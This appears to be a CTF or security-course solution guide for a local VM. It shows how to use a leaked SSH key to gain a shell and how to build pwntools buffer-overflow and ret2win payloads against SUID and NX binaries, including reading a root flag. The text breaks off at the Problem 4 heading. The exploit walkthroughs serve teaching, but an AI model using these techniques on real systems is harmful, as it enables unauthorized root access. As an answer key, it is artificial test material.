# Testing and Solution Guide

## Problem 1: Gain Access

### Summary
Goal: Obtain an unprivileged shell as `p1` and extract the flag from the home directory.
Hint: Look for information leakage on a public server that helps you connect.

### Steps
1. Discover the leak via `robots.txt`:
```bash
curl http://localhost:8000/robots.txt
```
2. Download the leaked SSH key and fix permissions:
```bash
curl -o id_rsa http://localhost:8000/backup/id_rsa
chmod 600 id_rsa
```
3. SSH into the VM as `p1`:
```bash
ssh -i id_rsa -p 2222 p1@localhost
```
4. Generate submission files inside the VM:
```bash
ctf-extract
```
5. Package files for submission:
```bash
tar -czf 2022CSZ123456-P1.tar.gz flag.txt key.txt
```

## Problem 2: Become Super

### Summary
Goal: Exploit a SUID-root binary in `/home/p1/p2/p2` to get a root shell and extract the P2 flag.
Hint: Classic stack buffer overflow with a `win()` function.

### Checks (inside VM)
```bash
ls -l /home/p1/p2/p2
file /home/p1/p2/p2
nm -n /home/p1/p2/p2 | grep " win$"
```

### Find the offset (pwntools)
1. Generate a cyclic pattern and crash the program:
```bash
python3 - <<'PY' > /tmp/pat
from pwn import cyclic
print(cyclic(300, n=8).decode())
PY

gdb -q /home/p1/p2/p2
(gdb) run < /tmp/pat
(gdb) info registers pc
```
2. Compute the offset:
```bash
python3 - <<'PY'
from pwn import cyclic_find
# Replace with the PC value from gdb (example below uses the bytes shown in the run log)
pc_bytes = b"jaaaaaaa"
print(cyclic_find(pc_bytes, n=8))
PY
```

### Working exploit (interactive shell)
1. Create the payload (replace `offset` or `win` if needed):
```bash
python3 - <<'PY' > /tmp/payload
from pwn import p64
offset = 72
win = 0x400704
payload = b"A"*offset + p64(win) + b"\n"
import sys
sys.stdout.buffer.write(payload)
PY
```
2. Keep stdin open and interact:
```bash
cat /tmp/payload - | /home/p1/p2/p2
id
cat /root/flag_p2.txt
```

Expected output (example):
```text
uid=0(root) gid=0(root) groups=0(root),1001(p1)
<flag-value>
```

### Submission
```bash
ctf-extract P2
tar -czf 2022CSZ123456-P2.tar.gz flag.txt key.txt
```
Copy submission to host:
```bash
scp -P 2222 -i id_rsa p1@localhost:2022CSZ123456-P2.tar.gz .
```

## Problem 3: Changing the Flow

### Summary
Goal: Redirect execution to `win()` in `/home/p1/p3/p3` (NX enabled) to print the P3 flag.
Hint: No injected code allowed; use ret2win.

### Checks (inside VM)
```bash
ls -l /home/p1/p3/p3
file /home/p1/p3/p3
nm -n /home/p1/p3/p3 | grep " win$"
```

### High-Level Steps
1. Find the offset to the return address (pattern + GDB).
2. Overwrite return address with `win()` address.
3. Read the printed flag. The binary also writes `/opt/p3/solved`, which enables `ctf-extract P3`.

### Concrete Steps (AArch64 example)
1. Get the `win()` address (use the current binary output):
```bash
nm -n /home/p1/p3/p3 | grep " win$"
```
Example output:
```
000000000040081c t win
```

2. Generate a cyclic pattern and crash:
```bash
python3 - <<'PY' > /tmp/pat
from pwn import cyclic
print(cyclic(300, n=8).decode())
PY

gdb -q /home/p1/p3/p3
(gdb) run < /tmp/pat
(gdb) info registers pc
```

3. Compute the offset (convert PC to bytes; example shown):
```bash
python3 - <<'PY'
from pwn import cyclic_find
pc_bytes = b"jaaaaaaa"  # replace with bytes from your PC value
print(cyclic_find(pc_bytes, n=8))
PY
```
This is typically `72` on this binary.

4. Build and run the payload (replace the `win` address if it differs):
```bash
python3 - <<'PY' > /tmp/p3_payload
from pwn import p64
offset = 72
win = 0x40081c   # replace with nm output
payload = b"A"*offset + p64(win) + b"\n"
open("/tmp/p3_payload","wb").write(payload)
PY

cat /tmp/p3_payload | /home/p1/p3/p3
```
Expected output:
```
FLAG: <flag-value>
```

### Submission
```bash
ctf-extract P3
tar -czf 2022CSZ123456-P3.tar.gz flag.txt key.txt
```
Copy submission to host:
```bash
scp -P 2222 -i id_rsa p1@localhost:2022CSZ123456-P3.tar.gz .
```

## Problem 4: Trusted Code Reuse
